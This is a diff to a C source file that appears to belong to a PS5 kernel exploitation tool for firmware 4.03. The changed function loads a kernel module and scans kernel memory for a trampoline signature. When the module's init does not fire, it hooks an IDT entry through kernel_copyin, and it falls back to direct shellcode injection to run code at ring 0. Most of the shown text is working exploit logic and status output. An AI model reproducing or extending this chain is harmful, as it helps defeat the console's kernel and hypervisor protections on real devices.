@@ -1770,28 +1770,35 @@ static void campaign_kmod_kldload(void) {
     uint64_t first_qword;
     memcpy(&first_qword, (void *)result_vaddr, sizeof(first_qword));
 
-    /* ── Step 4b: IDT-based manual invocation (if SYSINIT/MOD_LOAD didn't fire) ──
+    /* ── Step 4b: Locate module + optional IDT invocation ──
      *
-     * On PS5 FW 4.03 the kernel linker loads modules into RWX pages
-     * (GMET is not enforced until FW 6.50) but does NOT process SYSINIT
-     * or MOD_LOAD for dynamically loaded modules.
+     * ALWAYS scan kernel memory for the loaded module's trampoline.
+     * The scanner computes KLD function addresses from the .text layout:
+     *   gp_handler         = trampoline_kva + 0x30
+     *   trampoline_xapic_mode = trampoline_kva + 0x88
      *
-     * Fallback: hook an IDT entry via kernel_copyin, point it at the
-     * hv_idt_trampoline in the loaded module, and trigger "int N" from
-     * userland.  The CPU transitions to ring 0 through the IDT gate and
-     * executes our trampoline → hv_init → campaigns → IRETQ back.
+     * This is the ONLY reliable way to get these addresses because PS5's
+     * kernel linker does NOT resolve R_X86_64_64 relocations — so
+     * &gp_handler in the result buffer is always 0.
+     *
+     * If SYSINIT/MOD_LOAD didn't fire (first_qword == 0), we also hook
+     * an IDT entry to invoke hv_init manually via INT from userland.
      *
      * Since kldstat/kldsym are broken on PS5 (Sony modifications — they
      * return all zeros), we locate the module by scanning kernel virtual
      * memory for the trampoline's machine code signature.  The trampoline
      * is at offset 0 in .text, which is the first SHF_ALLOC section, so
      * it sits at the very start of the page-aligned kmem_malloc allocation.
-     *
-     * This mirrors the approach used by r0gdb / kstuff for kernel code
-     * execution on FW 4.03 (IDT hooking for int1 / int13).
      */
-    if (first_qword == 0) {
-        printf("\n[*] Step 4b: SYSINIT/MOD_LOAD did not fire — trying IDT invocation...\n");
+    {
+        int need_idt_invoke = (first_qword == 0);
+
+        if (need_idt_invoke) {
+            printf("\n[*] Step 4b: SYSINIT/MOD_LOAD did not fire — scanner + IDT invocation...\n");
+        } else {
+            printf("\n[*] Step 4b: SYSINIT/MOD_LOAD fired — scanning for KLD addresses...\n");
+            printf("    (PS5 linker doesn't resolve R_X86_64_64 — scanner needed for gp_handler)\n");
+        }
 
         /* ── 4b-1: Locate hv_idt_trampoline in kernel memory ── */
 
@@ -2370,6 +2377,22 @@ static void campaign_kmod_kldload(void) {
                        hdr[KMOD_XAPIC_OFFSET], hdr[KMOD_XAPIC_OFFSET+1],
                        hdr[KMOD_XAPIC_OFFSET+2], hdr[KMOD_XAPIC_OFFSET+3]);
             }
+        }
+
+        /* If SYSINIT already invoked hv_init, skip IDT hook and shellcode
+         * injection — we only needed the scanner for address computation.
+         * hv_init has a re-entry guard so IDT invoke would be harmless,
+         * but the scanner alone suffices for Phase 7/9 setup. */
+        if (!need_idt_invoke) {
+            if (g_kmod_gp_handler) {
+                printf("[+] Scanner found KLD gp_handler — skipping IDT invocation.\n");
+            } else if (trampoline_kva) {
+                printf("[!] Trampoline found but signature mismatch — gp_handler unavailable.\n");
+            } else {
+                printf("[-] Scanner did not find trampoline despite SYSINIT success.\n");
+                printf("    gp_handler KVA unavailable — Phase 9 cannot arm.\n");
+            }
+            goto idt_done;
         }
 
         /* ── Step 4c: Direct shellcode injection (if trampoline not found) ──
